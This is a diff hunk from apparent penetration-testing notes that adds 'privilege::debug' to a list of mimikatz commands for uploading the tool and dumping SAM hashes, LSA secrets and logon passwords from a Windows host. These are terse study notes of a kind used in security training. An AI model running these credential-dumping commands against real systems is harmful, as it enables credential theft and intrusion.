@@ -190,6 +190,7 @@ Steps:
 **To use mimikatz**
 - `upload /usr/share/windows_resources/mimikatz/x64/mimikatz.exe`
 - Run it -> It will open a mimikatz shell
+  - `privilege::debug`
   - `lsadump::sam` to dump SAM
   - `lsadump::secret` to dum secret
   - `sekurlsa::logonpasswords` maybe have clear text password
